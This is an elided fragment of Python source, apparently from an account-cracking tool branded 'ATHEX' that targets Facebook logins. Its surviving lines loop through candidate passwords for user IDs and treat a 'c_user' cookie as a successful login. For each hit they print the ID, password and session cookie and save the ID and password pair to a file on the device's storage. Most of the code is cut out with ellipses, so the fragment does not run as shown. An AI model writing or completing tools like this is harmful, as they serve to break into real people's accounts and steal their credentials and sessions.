...
def num():
    ...
    print(' [+] Ids saved in ATHEX-ok.txt,ATHEX-cp.txt')
...
def gml():
    ...
    print(' [+] \033[38;5;46mIds saved in ATHEX-ok.txt,ATHEX-cp.txt')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[ATHEX-OK 💕] {uid} | {ps}")

                print(f" Cookie : {coki}")

                open('/sdcard/ATHEX-ok.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                #print(f"\x1b[38;5;196m[ATHEX-CP 💔] {uid}|{ps}")

                #open('/sdcard/ATHEX-cp.txt', 'a').write( uid+' | '+ps+' \n')
        ...
        sys.stdout.write(f'\r\033[38;5;46m[ATHEX_] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
